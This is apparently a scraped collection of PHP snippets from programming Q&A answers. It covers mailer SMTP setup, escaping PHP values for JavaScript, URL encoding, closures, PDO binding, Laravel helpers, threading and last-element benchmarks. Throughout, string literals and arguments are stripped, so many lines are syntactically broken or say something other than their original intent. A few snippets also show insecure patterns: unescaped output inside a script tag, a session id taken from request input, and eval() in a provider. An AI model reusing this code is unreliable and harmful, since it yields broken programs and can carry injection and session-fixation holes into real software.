require_once "lib/Swift.php"; require_once "lib/Swift/Connection/SMTP.php"; $swift =& new Swift(new Swift_Connection_SMTP("localhost")); $swift =& new Swift(new Swift_Connection_SMTP("217.147.94.117", 419)); $swift = new Swift(new Swift_Connection_SMTP( "smtp.gmail.com", Swift_Connection_SMTP::PORT_SECURE, Swift_Connection_SMTP::ENC_TLS));
<?php /** * This example shows settings to use when sending via Google */ date_default_timezone_set( require $mail = new PHPMailer; $mail->isSMTP(); $mail->SMTPDebug = 2; $mail->Debugoutput = $mail->Host = $mail->Port = 587; $mail->SMTPSecure = $mail->SMTPAuth = true; $mail->Username = "username@gmail.com"; $mail->Password = "yourpassword"; $mail->setFrom( $mail->addReplyTo( $mail->addAddress( $mail->Subject = $mail->msgHTML(file_get_contents( $mail->AltBody = $mail->addAttachment( if (!$mail->send()) { echo "Mailer Error: " . $mail->ErrorInfo; } else { echo "Message sent!"; }
sudo apt-get install php-pear sudo pear install mail sudo pear install Net_SMTP sudo pear install Auth_SASL sudo pear install mail_mime
<script> var myvar = "<?php echo $myVarValue;?>"; </script>
<script> var myvar = <?php echo json_encode($myVarValue); ?>; </script>
function escapeJavaScriptText($string) { return str_replace("\n", }
<script> var myvar = decodeURIComponent("<?php echo rawurlencode($myVarValue); ?>"); </script>
function javascript_escape($str) { $new_str = $str_len = strlen($str); for($i = 0; $i < $str_len; $i++) { $new_str .= } return $new_str; }
<script> var myVar = <?php echo json_encode($myVarValue); ?>; </script>
<script> var myVar = <?= json_encode($myVarValue) ?>; </script>
function escapeJavaScriptText($string) { return str_replace("\n", }
<script type="text/javascript"> myvar = unescape( </script>
<?php $value = ?> <script type="text/javascript"> var foo = <?= json_encode($value) ?>; var foo = </script>
function inline_json_encode($obj) { return str_replace( }
string htmlspecialchars ( string $string [, int $quote_style [, string $charset [, bool $double_encode ]]] )
<form id="pagePhpVars" method="post"> <input type="hidden" name="phpString1" id="phpString1" value=" </form>
<script type="text/javascript" charset="UTF-8"> var moonUnitAlpha = document.getElementById( </script>
PHP_FUNCTION(rawurlencode) { char *in_str, *out_str; int in_str_len, out_str_len; if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &in_str, &in_str_len) == FAILURE) { return; } out_str = php_raw_url_encode(in_str, in_str_len, &out_str_len); RETURN_STRINGL(out_str, out_str_len, 0); }
PHP_FUNCTION(urlencode) { char *in_str, *out_str; int in_str_len, out_str_len; if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &in_str, &in_str_len) == FAILURE) { return; } out_str = php_url_encode(in_str, in_str_len, &out_str_len); RETURN_STRINGL(out_str, out_str_len, 0); }
PHPAPI char *php_raw_url_encode(char const *s, int len, int *new_length) { register int x, y; unsigned char *str; str = (unsigned char *) safe_emalloc(3, len, 1); for (x = 0, y = 0; len--; x++, y++) { str[y] = (unsigned char) s[x]; if ((str[y] < (str[y] < (str[y] > (str[y] > str[y++] = str[y++] = hexchars[(unsigned char) s[x] >> 4]; str[y] = hexchars[(unsigned char) s[x] & 15]; if (!isalnum(str[y]) && strchr("_-.~", str[y]) != NULL) { str[y++] = str[y++] = hexchars[os_toascii[(unsigned char) s[x]] >> 4]; str[y] = hexchars[os_toascii[(unsigned char) s[x]] & 15]; } } str[y] = if (new_length) { *new_length = y; } return ((char *) str); }
PHPAPI char *php_url_encode(char const *s, int len, int *new_length) { register unsigned char c; unsigned char *to, *start; unsigned char const *from, *end; from = (unsigned char *)s; end = (unsigned char *)s + len; start = to = (unsigned char *) safe_emalloc(3, len, 1); while (from < end) { c = *from++; if (c == *to++ = } else if ((c < (c < (c > (c > to[0] = to[1] = hexchars[c >> 4]; to[2] = hexchars[c & 15]; to += 3; } else if (!isalnum(c) && strchr("_-.", c) == NULL) { to[0] = to[1] = hexchars[os_toascii[c] >> 4]; to[2] = hexchars[os_toascii[c] & 15]; to += 3; } else { *to++ = c; } } *to = 0; if (new_length) { *new_length = to - start; } return (char *) start; }
/* rfc1738: ...The characters ";", "/", "?", ":", "@", "=" and "&" are the characters which may be reserved for special meaning within a scheme... ...Thus, only alphanumerics, the special characters "$-_.+!* reserved characters used for their reserved purposes may be used unencoded within a URL... For added safety, we only leave -_. unencoded. */ static unsigned char hexchars[] = "0123456789ABCDEF";
http%3A%2F%2Fwww.google.com%2Findex.html%3Fid%3Dasd%20asd
http%3A%2F%2Fwww.google.com%2Findex.html%3Fid%3Dasd+asd
echo "http: . "/category/" . rawurlencode("latest songs") . "/search?q=" . urlencode("lady gaga");
php > $url = <<< <<< > "Which, % of Alice <<< > EOD; php > echo $url, PHP_EOL; "Which, % of Alice php > echo urlencode($url), PHP_EOL; %22Which%2C+%25+of+Alice%27s+tasks+saw+%24s+%40+earnings%3F%22 php > echo rawurlencode($url), PHP_EOL; %22Which%2C%20%25%20of%20Alice%27s%20tasks%20saw%20%24s%20%40%20earnings%3F%22 php > echo rawurldecode(urlencode($url)), PHP_EOL; "Which,+%+of+Alice php > php > echo urldecode(rawurlencode($url)), PHP_EOL; "Which, % of Alice php >
echo urlencode("red shirt"); echo rawurlencode("red shirt");
public function getTotal($tax) { $total = 0.00; $callback = function ($quantity, $product) use ($tax, &$total) { $pricePerItem = constant(__CLASS__ . "::PRICE_" . strtoupper($product)); $total += ($pricePerItem * $quantity) * ($tax + 1.0); }; array_walk($this->products, $callback); return round($total, 2); }
<?php function generateComparisonFunctionForKey($key) { return function ($left, $right) use ($key) { if ($left[$key] == $right[$key]) return 0; else return ($left[$key] < $right[$key]) ? -1 : 1; }; } $myArray = array( array( array( ); $sortByName = generateComparisonFunctionForKey( $sortByAge = generateComparisonFunctionForKey( usort($myArray, $sortByName); usort($myArray, $sortByAge); ?>
function getFunctionTextInASecond(value) { return function () { document.getElementsByName( } } var textToDisplay = prompt( var myFunction = getFunctionTextInASecond(textToDisplay); window.setTimeout(myFunction, 1000);
<?php $message = "hello\n"; $example = function () { echo $message; }; $example(); $example = function () use ($message) { echo $message; }; $example(); $message = "world\n"; $example(); $message = "hello\n"; $example = function () use (&$message) { echo $message; }; $example(); $message = "world\n"; $example(); $example = function ($arg) use ($message) { echo $arg . }; $example("hello");
<?php $a = 1; $b = 2; $closureExampleEarlyBinding = function() use ($a, $b){ $a++; $b++; echo "Inside \$closureExampleEarlyBinding() \$a = ".$a."<br />"; echo "Inside \$closureExampleEarlyBinding() \$b = ".$b."<br />"; }; echo "Before executing \$closureExampleEarlyBinding() \$a = ".$a."<br />"; echo "Before executing \$closureExampleEarlyBinding() \$b = ".$b."<br />"; $closureExampleEarlyBinding(); echo "After executing \$closureExampleEarlyBinding() \$a = ".$a."<br />"; echo "After executing \$closureExampleEarlyBinding() \$b = ".$b."<br />"; /* this will output: Before executing $closureExampleEarlyBinding() $a = 1 Before executing $closureExampleEarlyBinding() $b = 2 Inside $closureExampleEarlyBinding() $a = 2 Inside $closureExampleEarlyBinding() $b = 3 After executing $closureExampleEarlyBinding() $a = 1 After executing $closureExampleEarlyBinding() $b = 2 */ ?>
<?php $a = 1; $b = 2; $closureExampleReferencing = function() use (&$a, &$b){ $a++; $b++; echo "Inside \$closureExampleReferencing() \$a = ".$a."<br />"; echo "Inside \$closureExampleReferencing() \$b = ".$b."<br />"; }; echo "Before executing \$closureExampleReferencing() \$a = ".$a."<br />"; echo "Before executing \$closureExampleReferencing() \$b = ".$b."<br />"; $closureExampleReferencing(); echo "After executing \$closureExampleReferencing() \$a = ".$a."<br />"; echo "After executing \$closureExampleReferencing() \$b = ".$b."<br />"; /* this will output: Before executing $closureExampleReferencing() $a = 1 Before executing $closureExampleReferencing() $b = 2 Inside $closureExampleReferencing() $a = 2 Inside $closureExampleReferencing() $b = 3 After executing $closureExampleReferencing() $a = 2 After executing $closureExampleReferencing() $b = 3 */ ?>
Event::listen( { dd(array($query, $params, $time, $conn)); }); DB::table(
$sex = $s = $dbh->prepare( $s->bindParam( $sex = $s->execute();
$sex = $s = $dbh->prepare( $s->bindValue( $sex = $s->execute();
<?php $stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (?, ?)"); $stmt->bindParam(1, $name); $stmt->bindParam(2, $value); $name = $value = 1; $stmt->execute(); $name = $value = 2; $stmt->execute();
$stmt = $pdo->prepare("SELECT * FROM someTable WHERE col = :val"); $stmt->execute([":val" => $bind]);
<IfModule mod_php5.c> php_value post_max_size 200M php_value upload_max_filesize 200M php_value memory_limit 300M php_value max_execution_time 259200 php_value max_input_time 259200 php_value session.gc_maxlifetime 1200 </IfModule>
sleep(2); ini_set( register_shutdown_function(function(){ var_dump(microtime(true) - $_SERVER[ }); for(;;); // //
<p>Foo Formated text: {{ fooFormatText($text) }}</p>
"autoload": { "classmap": [ ... ], "psr-4": { "App\\": "app/" }, "files": [ "app/helpers.php" ] },
public function register() { foreach (glob(app_path(). require_once($filename); } }
<?php namespace App\Helpers; class Helper { public static function shout(string $string) { return strtoupper($string); } }
<!-- Code within resources/views/template.blade.php --> {!! Helper::shout(
<?php namespace App\Http\Controllers; use Helper; class SomeController extends Controller { public function __construct() { Helper::shout( } ...
namespace App\Helpers; class BobFinder { static function bob() { return } }
<?php namespace App\Providers; use Illuminate\Support\ServiceProvider; use Blade; class AppServiceProvider extends ServiceProvider { /** * Bootstrap any application services. * * @return void */ public function boot() { Blade::directive( return trim(strtoupper($string), }); Blade::directive( return }); } ...
<?php namespace App\Providers; use Illuminate\Support\ServiceProvider; class HelperServiceProvider extends ServiceProvider { protected $helpers = [ ]; /** * Bootstrap the application services. */ public function boot() { // } /** * Register the application services. */ public function register() { foreach ($this->helpers as $helper) { $helper_path = app_path(). if (\File::isFile($helper_path)) { require_once $helper_path; } } } }
... "autoload": { "files": [ "app/helpers/my_helper.php", ... ] }, ...
... "autoload": { "classmap": [ "database" ], "files": [ "app/Libraries/commonFunctions.php" ], "psr-4": { "App\\": "app/" } }, ...
<?php namespace App\Providers; use Illuminate\Support\ServiceProvider; class HelperServiceProvider extends ServiceProvider { /** * The helper mappings for the application. * * @var array */ protected $helpers = [ ]; /** * Bootstrap the application helpers. * * @return void */ public function boot() { foreach ($this->helpers as $alias => $method) { if (!function_exists($alias)) { eval("function {$alias}(...\$args) { return {$method}(...\$args); }"); } } } /** * Register the service provider. * * @return void */ public function register() { // } }
./app/MyApp/Facades/Helper.php ./app/MyApp/Facades/HelperFacade.php ./app/MyApp/Providers/HelperServiceProvider.php
=========================== Finished =========================== Add these lines to config/app.php: ---------------------------------- Providers: App\MyApp\Providers\HelperServiceProvider, Alias:
<?php namespace App\MyApp\Facades; class Helper { // }
<?php namespace App\MyApp\Facades; use Request; class Helper { public function isActive($pattern = null, $include_class = false) { return ((Request::is($pattern)) ? (($include_class) ? } } This is how it would be called: =============================== {!! Helper::isActive(
display_syntax(){ echo "" echo " The Syntax is like this:" echo " ========================" echo " "$(basename $0)" -f <facade_name> -n echo "" echo " Example:" echo " ========" echo " "$(basename $0) -f test -n " echo "" } if [ $ then echo "" display_syntax exit else while [[ $ do key="$1" case $key in -n|--namespace_prefix) namespace_prefix_in="$2" echo "" shift ;; -f|--facade) facade_name_in="$2" shift ;; *) ;; esac shift done fi echo Facade Name = ${facade_name_in} echo Namespace Prefix = $(echo ${namespace_prefix_in} | sed -e echo "" } function display_start_banner(){ echo echo echo } function init_and_export_vars(){ echo echo "INIT and EXPORT VARS" echo "====================" # # namespace_prefix=$(echo ${namespace_prefix_in} | sed -e namespace_prefix_lowerfirstchar=$(echo ${namespace_prefix_in} | sed -e facade_name_upcase=$(echo ${facade_name_in} | sed -e facade_name_lowercase=$(echo ${facade_name_in} | awk source_template= namespace {namespace_prefix}\Facades; class {facade_name_upcase} { // } ' serviceProvider_template= namespace {namespace_prefix}\Providers; use Illuminate\Support\ServiceProvider; use App; class {facade_name_upcase}ServiceProvider extends ServiceProvider { public function boot() { // } public function register() { App::bind("{facade_name_lowercase}", function() { return new \{namespace_prefix}\Facades\{facade_name_upcase}; }); } } ' facade_template= namespace {namespace_prefix}\Facades; use Illuminate\Support\Facades\Facade; class {facade_name_upcase}Facade extends Facade { protected static function getFacadeAccessor() { return "{facade_name_lowercase}"; } } ' } function checkDirectoryExists(){ if [ ! -d ${namespace_prefix_lowerfirstchar} ] then echo "" echo "Can echo "" echo "*** NOTE:" echo " Make sure the namspace directory exists and" echo " you use quotes around the namespace_prefix." echo "" display_syntax exit fi } function makeDirectories(){ echo "Make Directories" echo "================" mkdir -p ${namespace_prefix_lowerfirstchar}/Facades mkdir -p ${namespace_prefix_lowerfirstchar}/Providers mkdir -p ${namespace_prefix_lowerfirstchar}/Facades } function createSourceTemplate(){ source_template=$(echo "${source_template}" | sed -e echo "Create Source Template:" echo "=======================" echo "${source_template}" echo "" echo "${source_template}" > ./${namespace_prefix_lowerfirstchar}/Facades/${facade_name_upcase}.php } function createServiceProviderTemplate(){ serviceProvider_template=$(echo "${serviceProvider_template}" | sed -e echo "Create ServiceProvider Template:" echo "================================" echo "${serviceProvider_template}" echo "" echo "${serviceProvider_template}" > ./${namespace_prefix_lowerfirstchar}/Providers/${facade_name_upcase}ServiceProvider.php } function createFacadeTemplate(){ facade_template=$(echo "${facade_template}" | sed -e echo "Create Facade Template:" echo "=======================" echo "${facade_template}" echo "" echo "${facade_template}" > ./${namespace_prefix_lowerfirstchar}/Facades/${facade_name_upcase}Facade.php } function serviceProviderPrompt(){ echo "Providers: ${namespace_prefix_in}\Providers\\${facade_name_upcase}ServiceProvider," } function aliasPrompt(){ echo "Alias: } # # display_start_banner init_and_export_vars makeDirectories checkDirectoryExists echo "" createSourceTemplate createServiceProviderTemplate createFacadeTemplate echo "" echo "===========================" echo " Finished TEST" echo "===========================" echo "" echo "Add these lines to config/app.php:" echo "----------------------------------" serviceProviderPrompt aliasPrompt echo ""
<?php namespace App\Helpers; class MyFuncs { public static function full_name($first_name,$last_name) { return $first_name . } }
<?php namespace App\Providers; use Illuminate\Support\ServiceProvider; class HelperServiceProvider extends ServiceProvider { /** * Bootstrap the application services. * * @return void */ public function boot() { // } /** * Register the application services. * * @return void */ public function register() { foreach (glob(app_path(). require_once($filename); } } }
namespace App\Providers; defines the namespace provider use Illuminate\Support\ServiceProvider; imports the ServiceProvider class namespace class HelperServiceProvider extends ServiceProvider {…} defines a class HelperServiceProvider that extends the ServiceProvider class public function boot(){…} bootstraps the application service public function register(){…} is the function that loads the helpers foreach (glob(app_path().
Route::get( return MyFuncs::full_name("John","Doe"); });
return MyFuncs::full_name("John","Doe"); calls the static function full_name in MyFuncs class
<?php namespace App\library { class hrapplication{ public static function libData(){ return "Data"; } } } ?>
$FmyFunctions = new \App\FolderName\classsName; echo $is_ok = ($FmyFunctions->libData());
"autoload": { "classmap": [ "database" ], "psr-4": { "App\\": "app/" }, "files": [ "app/Helpers/customHelpers.php" ] }, "autoload-dev": { "classmap": [ "tests/TestCase.php" ] },
"autoload": { "classmap": [ "database/seeds", "database/factories", "database","app/Helper/Helpers.php" ], "psr-4": { "App\\": "app/" }, "files": ["app/Helper/Helpers.php"] },
"autoload": { "classmap": [ "database" ], "files": [ "app/Http/helpers.php" ], "psr-4": { "App\\": "app/" } },
... "autoload": { "classmap": [ "database" ], "psr-4": { "App\\": "app/" }, "files": [ "helpers/ui_helpers.php" ] }, ...
class Helper() { public function uppercasePara($str) { return } }
<?php namespace App\Helpers; use Illuminate\Database\Eloquent\Collection; class StatusHelper { protected static $_status = [ 1=> [ ], 2 => [ ], 3 => [ ], ]; public static function getStatusesList() { $status = (new Collection(self::$_status))->pluck( return $status; } }
use App\Helpers\StatusHelper; class ExampleController extends Controller { public function index() { $statusList = StatusHelper::getStatusesList(); return view( } }
<?php $data = file_put_contents("filename.txt", $data); ?>
echo $clientid; echo echo $lastname; echo echo chr (13). chr (10);
$variable = "and"; echo "part 1 $variable part 2<br/>"; echo "part 1 ".$variable." part 2";
<?php class AsyncOperation extends Thread { public function __construct($arg) { $this->arg = $arg; } public function run() { if ($this->arg) { $sleep = mt_rand(1, 10); printf( sleep($sleep); printf( } } } $stack = array(); foreach ( range("A", "D") as $i ) { $stack[] = new AsyncOperation($i); } foreach ( $stack as $t ) { $t->start(); } ?>
12:00:06pm: A -start -sleeps 5 12:00:06pm: B -start -sleeps 3 12:00:06pm: C -start -sleeps 10 12:00:06pm: D -start -sleeps 2 12:00:08pm: D -finish 12:00:09pm: B -finish 12:00:11pm: A -finish 12:00:16pm: C -finish
12:01:36pm: A -start -sleeps 6 12:01:36pm: B -start -sleeps 1 12:01:36pm: C -start -sleeps 2 12:01:36pm: D -start -sleeps 1 12:01:37pm: B -finish 12:01:37pm: D -finish 12:01:38pm: C -finish 12:01:42pm: A -finish
error_reporting(E_ALL); class AsyncWebRequest extends Thread { public $url; public $data; public function __construct($url) { $this->url = $url; } public function run() { if (($url = $this->url)) { /* * If a large amount of data is being requested, you might want to * fsockopen and read using usleep in between reads */ $this->data = file_get_contents($url); } else printf("Thread } } $t = microtime(true); $g = new AsyncWebRequest(sprintf("http: if ($g->start()) { printf("Request took %f seconds to start ", microtime(true) - $t); while ( $g->isRunning() ) { echo "."; usleep(100); } if ($g->join()) { printf(" and %f seconds to finish receiving %d bytes\n", microtime(true) - $t, strlen($g->data)); } else printf(" and %f seconds to finish, request failed\n", microtime(true) - $t); }
for ($i=0; $i<10; $i++) { for ($j=0; $j<10; $j++) { $pipe[$j] = popen( } for ($j=0; $j<10; ++$j) { pclose($pipe[$j]); } }
$request = "http: $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $request); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 1); curl_exec($ch); curl_close($ch); echo $_REQUEST["PHPSESSID"];
set_time_limit(0); if ($_REQUEST["sessionid"]) session_id($_REQUEST["sessionid"]); function checkclose() { global $_SESSION; if ($_SESSION["closesession"]) { unset($_SESSION["closesession"]); die(); } } while(!$close) { session_start(); $_SESSION["test"] = rand(); checkclose(); session_write_close(); sleep(5); }
if ($_REQUEST["sessionid"]) session_id($_REQUEST["sessionid"]); session_start(); var_dump($_SESSION);
if ($_REQUEST["sessionid"]) session_id($_REQUEST["sessionid"]); session_start(); $_SESSION["closesession"] = true; var_dump($_SESSION);
$script_exec = "c:/php/php.exe c:/path/my_ascyn_script.php"; pclose(popen("start /B ". $script_exec, "r"));
chdir(dirname(__FILE__)); for ($i = 0; $i < 2; $i += 1){ exec("php test_1.php $i > test.txt &");
$conn=mysql_connect($host,$user,$pass); $db=mysql_select_db($db); $i = $argv[1]; for($j = 0;$j<5000; $j ++) { mysql_query("insert into test set id= comment= datetime=NOW() "); }
$array = array( unset($array[2]); echo $array[sizeof($array) - 1];
$lastEl = array_values(array_slice($array, -1))[0];
Strict Standards: Only variables should be passed by reference
sudo docker run -it --rm php:5.6.38-cli-stretch php -r
<<input code>> error_reporting(E_ALL); <<option code>> error_reporting(0); $before=microtime(TRUE); for($i=0;$i<100;$i++){echo ".";for($j=0;$j<100;$j++){ <<option code>> }}; $after=microtime(TRUE); echo "\n"; var_dump($x); echo round(($after-$before)/(100*100)*1000*1000*1000);
/==========================================================================================================================================================================================================================================================================================================================================================================================================================\ || || T E S T I N P U T - 5 . 6 . 3 8 || T E S T I N P U T - 7 . 2 . 1 0 || T E S T I N P U T - 7 . 3 . 0 R C 1 || || || null | empty | last_null | auto_idx | shuffle | 100 | 100000 || null | empty | last_null | auto_idx | shuffle | 100 | 100000 || null | empty | last_null | auto_idx | shuffle | 100 | 100000 || ||============================OPTIONS - ERRORS==========================++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============<| || 1. $x = array_values(array_slice($array, -1))[0]; || W1 + W2 | N1 | - | - | - | - | - || W1 + W2 | N1 | - | - | - | - | - || W1 + W2 | N1 | - | - | - | - | - || || 2. $x = array_slice($array, -1)[0]; || W1 | N1 | - | - | - | - | - || W1 | N1 | - | - | - | - | - || W1 | N1 | - | - | - | - | - || || 3. $x = array_pop((array_slice($array, -1))); || W1 + W3 | - | - | - | - | - | - || W1 + N2 + W3 | N2 | N2 | N2 | N2 | N2 | N2 || W1 + N2 + W3 | N2 | N2 | N2 | N2 | N2 | N2 || || 4. $x = array_pop((array_slice($array, -1, 1))); || W1 + W3 | - | - | - | - | - | - || W1 + N2 + W3 | N2 | N2 | N2 | N2 | N2 | N2 || W1 + N2 + W3 | N2 | N2 | N2 | N2 | N2 | N2 || || 5. $x = end($array); reset($array); || W4 + W5 | - | - | - | - | - | - || W4 + W5 | N2 | N2 | N2 | N2 | N2 | N2 || W4 + W5 | - | - | - | - | - | - || || 6. $x = end((array_values($array))); || W2 + W4 | - | - | - | - | - | - || W2 + N2 + W4 | - | - | - | - | - | - || W2 + N2 + W4 | N2 | N2 | N2 | N2 | N2 | N2 || || 7. $x = $array[count($array)-1]; || - | N3 | - | - | - | - | - || W7 | N3 | - | - | - | - | - || W7 | N3 | - | - | - | - | - || || 8. $keys = array_keys($array); $x = $array[$keys[count($keys)-1]]; || W6 | N3 + N4 | - | - | - | - | - || W6 + W7 | N3 + N4 | - | - | - | - | - || W6 + W7 | N3 + N4 | - | - | - | - | - || || 9. $x = $array[] = array_pop($array); || W3 | - | - | - | - | - | - || W3 | - | - | - | - | - | - || W3 | - | - | - | - | - | - || || 10. $x = $array[array_key_last($array)]; || F1 | F1 | F1 | F1 | F1 | F1 | F1 || F2 | F2 | F2 | F2 | F2 | F2 | F2 || W8 | N4 | F2 | F2 | F2 | F2 | F2 || ||========================OPTIONS - VALUE RETRIEVED=====================++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============<| || 1. $x = array_values(array_slice($array, -1))[0]; || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 2. $x = array_slice($array, -1)[0]; || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 3. $x = array_pop((array_slice($array, -1))); || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 4. $x = array_pop((array_slice($array, -1, 1))); || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 5. $x = end($array); reset($array); || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 6. $x = end((array_values($array))); || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | bool(false) | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 7. $x = $array[count($array)-1]; || NULL | NULL | NULL | string(1) "d" | string(1) "b" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "b" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "b" | int(99) | int(99999) || || 8. $keys = array_keys($array); $x = $array[$keys[count($keys)-1]]; || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 9. $x = $array[] = array_pop($array); || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || NULL | NULL | NULL | string(1) "d" | string(1) "c" | int(99) | int(99999) || || 10. $x = $array[array_key_last($array)]; || N/A | N/A | N/A | N/A | N/A | N/A | N/A || N/A | N/A | N/A | N/A | N/A | N/A | N/A || N/A | N/A | N/A | N/A | N/A | N/A | N/A || ||=================OPTIONS - FEMTOSECONDS PER ITERATION=================++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============++===============+===============+===============+===============+===============+===============+===============<| || 1. $x = array_values(array_slice($array, -1))[0]; || 803 | 466 | 390 | 384 | 373 | 764 | 1.046.642 || 691 | 252 | 101 | 128 | 93 | 170 | 89.028 || 695 | 235 | 90 | 97 | 95 | 188 | 87.991 || || 2. $x = array_slice($array, -1)[0]; || 414 | 349 | 252 | 248 | 246 | 604 | 1.038.074 || 373 | 249 | 85 | 91 | 90 | 164 | 90.750 || 367 | 224 | 78 | 85 | 80 | 155 | 86.141 || || 3. $x = array_pop((array_slice($array, -1))); || 724 | 228 | 323 | 318 | 350 | 673 | 1.042.263 || 988 | 285 | 309 | 317 | 331 | 401 | 88.363 || 877 | 266 | 298 | 300 | 326 | 403 | 87.279 || || 4. $x = array_pop((array_slice($array, -1, 1))); || 734 | 266 | 358 | 356 | 349 | 699 | 1.050.101 || 887 | 288 | 316 | 322 | 314 | 408 | 88.402 || 935 | 268 | 335 | 315 | 313 | 403 | 86.445 || || 5. $x = end($array); reset($array); || 715 | 186 | 185 | 180 | 176 | 185 | 172 || 674 | 73 | 69 | 70 | 66 | 65 | 70 || 693 | 65 | 85 | 74 | 68 | 70 | 69 || || 6. $x = end((array_values($array))); || 877 | 205 | 320 | 337 | 304 | 2.901 | 7.921.860 || 948 | 300 | 336 | 308 | 309 | 509 | 29.696.951 || 946 | 262 | 301 | 309 | 302 | 499 | 29.234.928 || || 7. $x = $array[count($array)-1]; || 123 | 300 | 137 | 139 | 143 | 140 | 144 || 312 | 218 | 48 | 53 | 45 | 47 | 51 || 296 | 217 | 46 | 44 | 53 | 53 | 55 || || 8. $keys = array_keys($array); $x = $array[$keys[count($keys)-1]]; || 494 | 593 | 418 | 435 | 399 | 3.873 | 12.199.450 || 665 | 407 | 103 | 109 | 114 | 431 | 30.053.730 || 647 | 445 | 91 | 95 | 96 | 419 | 30.718.586 || || 9. $x = $array[] = array_pop($array); || 186 | 178 | 175 | 188 | 180 | 181 | 186 || 83 | 78 | 75 | 71 | 74 | 69 | 83 || 71 | 64 | 70 | 64 | 68 | 69 | 81 || || 10. $x = $array[array_key_last($array)]; || N/A | N/A | N/A | N/A | N/A | N/A | N/A || N/A | N/A | N/A | N/A | N/A | N/A | N/A || 370 | 223 | 49 | 52 | 61 | 57 | 52 || \=========================================================================================================================================================================================================================================================================================================================================================================================================================/
F1 = Fatal error: Call to undefined function array_key_last() in Command line code on line 1 F2 = Fatal error: Uncaught Error: Call to undefined function array_key_last() in Command line code:1 W1 = Warning: array_slice() expects parameter 1 to be array, null given in Command line code on line 1 W2 = Warning: array_values() expects parameter 1 to be array, null given in Command line code on line 1 W3 = Warning: array_pop() expects parameter 1 to be array, null given in Command line code on line 1 W4 = Warning: end() expects parameter 1 to be array, null given in Command line code on line 1 W5 = Warning: reset() expects parameter 1 to be array, null given in Command line code on line 1 W6 = Warning: array_keys() expects parameter 1 to be array, null given in Command line code on line 1 W7 = Warning: count(): Parameter must be an array or an object that implements Countable in Command line code on line 1 W8 = Warning: array_key_last() expects parameter 1 to be array, null given in Command line code on line 1 N1 = Notice: Undefined offset: 0 in Command line code on line 1 N2 = Notice: Only variables should be passed by reference in Command line code on line 1 N3 = Notice: Undefined offset: -1 in Command line code on line 1 N4 = Notice: Undefined index: in Command line code on line 1
var_dump(end(array(1, 2, 3))); var_dump(call_user_func( var_dump(end(array_values(array(1, 2, 3)))); var_dump(call_user_func(
function array_last($array) { if (count($array) < 1) return null; $keys = array_keys($array); return $array[$keys[sizeof($keys) - 1]]; }
$last = end($array); $last = !empty($array) ? end($array) : null;
function array_last($array) { if (empty($array)) { return null; } return end($value); }
function array_last($array) { if (empty($array)) { return null; } foreach (array_slice($array, -1) as $value) { return $value; } }
$last = !empty($array) ? $array[count($array)-1] : null;
$array = array( echo end($array); $array1 = array( echo end($array1);
Method: $array[count($array)-1]; Small array (s): 0.000319957733154 Large array (s): 0.000526905059814 Note: Fastest! count() must access an internal length property. Note: This method only works if the array is naturally-keyed (0, 1, 2, ...). Method: array_slice($array, -1)[0]; Small array (s): 0.00145292282104 Large array (s): 0.499367952347 Method: array_pop((array_slice($array, -1, 1))); Small array (s): 0.00162816047668 Large array (s): 0.513121843338 Method: end($array); Small array (s): 0.0028350353241 Large array (s): 4.81077480316 Note: Slowest...
function lelement($array) {return end($array);} $last_element = lelement($array);
$array = array( $lastItem = $array[(array_keys($array)[(count($array)-1)])]; echo $lastItem;
$first = array_key_first( [1, 2, $last = array_key_last ( [1, 2,
$lastElement = count($array) > 0 ? array_values(array_slice($array, -1))[0] : null;
if (!function_exists( function array_key_last($array) { return array_slice(array_keys($array),-1)[0]; } } if (!function_exists( function array_key_first($array) { return array_slice(array_keys($array),0)[0]; } } $first_element_key = array_key_first($array); $first_element_value = $array[array_key_first($array)]; $last_element_key = array_key_last($array); $last_element_value = $array[array_key_last($array)];
$file_name_dm = $_FILES["video"]["name"]; $ext_thumb = extension($file_name_dm); echo extension($file_name_dm); function extension($str){ $str=implode("",explode("\\",$str)); $str=explode(".",$str); $str=strtolower(end($str)); return $str; }
<?php function endc($array) { return end($array); } $items = array( $lastItem = endc($items); $current = current($items); ?>
